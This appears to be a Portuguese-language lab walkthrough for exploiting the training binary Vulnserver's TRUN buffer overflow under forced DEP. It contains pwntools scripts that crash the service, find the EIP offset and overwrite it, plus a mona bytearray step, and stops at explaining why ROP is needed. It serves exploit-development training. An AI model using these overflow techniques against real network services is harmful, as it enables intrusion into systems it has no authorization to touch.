## Configuracao

> Baixe o Binário: [Vulnserver](https://github.com/stephenbradshaw/vulnserver) o .exe e .dll
> Force o DEP: No seu Windows de teste, abra o terminal como Admin e rode: `bcdedit /set nx AlwaysOn`
> Executar o .exe:
<img width="734" height="434" alt="image" src="https://github.com/user-attachments/assets/e867d184-8db8-46d0-a8e7-8023eed1d665" />
> Conecao com netcat:
<img width="530" height="405" alt="image" src="https://github.com/user-attachments/assets/848611b1-0e9d-40ca-b2ff-d71a9348381f" />
> Abra o Immunity como administrador e atache o proceso
<img width="1023" height="474" alt="image" src="https://github.com/user-attachments/assets/0da55807-8d6e-49cf-b17b-5bbc6660cb98" />
> F9 para comecar o programa

---

> Primeiro comprovamos que o programa crashea com o envio de muitos caracteres
<img width="1846" height="965" alt="image" src="https://github.com/user-attachments/assets/79e196d5-b64f-496a-89af-34f55f9f9932" />


> Fazemos automaticacao com um script em python
```
from pwn import *

# Estabelece a conexão
p = remote("192.168.0.140", 9999)

# Recebe o banner de boas-vindas
print(p.recvline().decode())

# Prepara o buffer de 3000 bytes
prefix = b"TRUN . "
lixo = b"A" * 3000
payload = prefix + lixo

# Envia e encerra
log.info("Enviando payload...")
p.sendline(payload)
p.close()
```

> Criamos o patrao com gdb
<img width="692" height="260" alt="image" src="https://github.com/user-attachments/assets/30f487ed-7eb4-40e1-8a3b-68311b86f60d" />

> Colocamos os caracteres no script

`lixo = b"...aalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaab...."`

> Lancamos o script
> Pegamos o valor do EIP
<img width="574" height="229" alt="image" src="https://github.com/user-attachments/assets/7f2adbd3-c2cd-41bf-b302-212a77464017" />

> Pegamos o offset
<img width="520" height="512" alt="image" src="https://github.com/user-attachments/assets/42254161-93fa-4a85-b26f-3164ef037d24" />

> Mudamos o script para confirmar a escritura no EIP
```
from pwn import *

# Estabelece a conexão
p = remote("192.168.0.140", 9999)

# Recebe o banner de boas-vindas
print(p.recvline().decode())

# Prepara o buffer de 3000 bytes
prefix = b"TRUN . "
lixo = (b"A"*2005) + b"BBBB" + (b"C" * 300)
payload = prefix + lixo

# Envia e encerra
log.info("Enviando payload...")
p.sendline(payload)
p.close()
```


<img width="1030" height="587" alt="image" src="https://github.com/user-attachments/assets/87eadd46-d2c5-453e-a297-d8be83254d70" />

### O DEP "Falso" que é Verdadeiro
O Windows tem uma configuração global chamada DEP Policy. Se você seguiu o passo de configurar o Windows como AlwaysOn (bcdedit /set nx AlwaysOn), o Windows ignora o que a DLL diz.

A DLL diz: "Eu não fui compilada com suporte a DEP (NX: False)".

<img width="1775" height="318" alt="image" src="https://github.com/user-attachments/assets/c6e962c2-2e12-4ddd-8b46-0cfafad74350" />

- Agora copiamos os byterray e colamos no script para logo executarlo e comprovar o DEP ativado
- No immunity: `!mona bytearray -cpb "\x00"`
<img width="1420" height="586" alt="image" src="https://github.com/user-attachments/assets/6212ad47-c671-4e5a-860a-2dcb834a9262" />


O Windows responde: "Não me importa, eu vou forçar o DEP em todos os processos de qualquer maneira".

<img width="917" height="396" alt="image" src="https://github.com/user-attachments/assets/1be34fa4-42b8-4573-b85b-ced482b2207f" />

É por isso que, mesmo o Mona dizendo False, o seu exploit de JMP ESP vai dar Access Violation. O ROP serve justamente para "derrotar" essa imposição do sistema operacional.













